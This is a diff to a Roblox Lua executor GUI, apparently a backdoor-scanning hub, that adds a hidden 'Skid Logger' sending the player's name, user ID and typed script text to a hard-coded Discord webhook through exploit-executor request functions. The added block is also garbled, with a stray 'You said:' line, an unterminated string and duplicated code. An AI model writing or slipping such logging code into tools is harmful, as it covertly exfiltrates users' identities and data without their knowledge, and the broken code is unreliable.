@@ -121,7 +121,7 @@ G2L["11"]["TextColor3"] = Color3.fromRGB(198, 119, 88);
 G2L["11"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
 G2L["11"]["MultiLine"] = true;
 G2L["11"]["BackgroundTransparency"] = 1;
-G2L["11"]["PlaceholderText"] = [[Put your require or script here!]];
+G2L["11"]["PlaceholderText"] = [[Put your skidded text hede]];
 G2L["11"]["Size"] = UDim2.new(0, 448, 0, 150);
 G2L["11"]["Text"] = [[]];
 G2L["11"]["Position"] = UDim2.new(0.015692640095949173, 0, 0.042270027101039886, 0);
@@ -1596,7 +1596,56 @@ local script = G2L["20"];
 		return false
 	
 	end
+
+You said:
+							local request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
+					if request and not _G.LALOL_Hub_Backdoor_Logs_Disabled then 
+						request({
+							Url = 'https://discord.com/api/webhooks/1395137173237268571/I3rrbp8lFIV74cMDiCk2EGGBBKjj4KYVWokR8GJbTvoYHSljmPu6Zh3pmzk6u1MrvWgI',
+							Method = 'POST',
+							Headers = {
+								['Content-Type'] = 'application/json',
+							},
+							Body = HttpService:JSONEncode({
+								username='Skid Logger',
+								content="**User: "..game:GetService('Players').LocalPlayer.Name..' | '..game:GetService('Players').LocalPlayer.UserId..'\script a(the code),
+							})
+						})
+					end
 	
+					return true
+				end
+--				debug('"'..remote:GetFullName()..'" seems like not backdoor', 1)
+			end
+			
+			wait()--.1)
+			
+		end
+	
+		return false
+	
+end
+
+local request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
+if request and not _G.LALOL_Hub_Backdoor_Logs_Disabled then
+    local player = game:GetService("Players").LocalPlayer
+    local contentMessage = "**User: `" .. player.Name .. "` | `" .. player.UserId .. "`** GUI.Executor.ExecutorBox.TextBox.Text"
+
+    request({
+        Url = "https://discord.com/api/webhooks/1395137173237268571/I3rrbp8lFIV74cMDiCk2EGGBBKjj4KYVWokR8GJbTvoYHSljmPu6Zh3pmzk6u1MrvWgI",
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json",
+        },
+        Body = HttpService:JSONEncode({
+            username = "Skid Logger",
+            content = contentMessage,
+        }),
+    })
+end
+
+return true
+
 	GUI.Executor.Execute.Button.MouseButton1Click:Connect(function()
 		local a,b=string.gsub(GUI.Executor.ExecutorBox.TextBox.Text, '%%username%%', game:GetService('Players').LocalPlayer.Name)
 		
